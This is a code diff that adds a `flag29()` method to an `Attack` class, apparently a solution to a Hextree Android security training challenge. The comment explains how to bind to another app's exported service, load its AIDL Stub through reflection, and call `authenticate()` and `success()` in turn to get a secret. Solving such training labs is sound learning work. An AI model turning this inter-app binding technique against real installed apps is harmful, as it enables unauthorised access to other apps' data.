@@ -543,6 +543,37 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		context.bindService(intent, Flag28Service.serviceConnection, Context.BIND_AUTO_CREATE)
 	}
 
+
+	/**
+	 * FLAG 29 - Reflection-Based AIDL Binding (No .aidl file)
+	 * Technique: Dynamic ClassLoader + reflection into the target app's real Stub/Proxy
+	 *
+	 * Flow:
+	 * 1. Borrow the target app's ClassLoader so we can load ITS compiled classes
+	 * 2. Load IFlag29Interface by name, find its generated Stub, reflectively call
+	 *    the static Stub.asInterface(IBinder) to wrap the raw service binder
+	 * 3. init() -> server generates+returns a one-time password
+	 * 4. authenticate(password) -> void; service just stashes a pass/fail flag
+	 *    internally, nothing comes back to us to check
+	 * 5. success() -> service checks its own internal flag and only then launches
+	 *    Flag29Activity with the secret
+	 *
+	 * Key insight: authenticate() is void, not Boolean - there's no client-side
+	 * verdict to branch on. You call authenticate() then success() unconditionally;
+	 * the service alone decides whether success() actually does anything.
+	 */
+	fun flag29() {
+		val servicePath = "$packageName.services.Flag29Service"
+		val intent = Intent().apply {
+			setClassName(packageName, servicePath)
+		}
+		context.bindService(
+			intent,
+			Flag29Service(context).serviceConnection,
+			Context.BIND_AUTO_CREATE
+		)
+	}
+
 // ------------------- Content Providers Flags ------------------------//
 
 	/**
